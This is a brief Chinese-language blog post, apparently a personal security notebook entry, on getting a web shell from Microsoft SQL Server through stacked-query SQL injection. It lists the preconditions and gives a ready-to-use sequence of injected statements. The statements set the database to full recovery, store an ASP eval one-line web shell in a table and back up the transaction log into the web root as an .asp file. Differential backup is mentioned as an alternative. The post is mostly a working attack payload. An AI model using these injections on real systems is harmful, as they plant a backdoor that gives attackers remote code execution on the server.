---
title: "MSSQL Log Getshell"
date: 2018-03-14T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mssql','sqli']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

需要支持堆查询.

db_owner 权限即可.

<!--more-->

```
;alter database xxxx set RECOVERY FULL--
;create table cmd (a image)--
;backup log xxxx to disk = 'd:/web/1.bak' with init--
;insert into cmd (a) values ('<% eval request(1) %>')--
;backup log xxxx to disk = 'd:/web/2.asp'--
```



另外还有差异备份, 不过缺点是备份出来的文件会很大.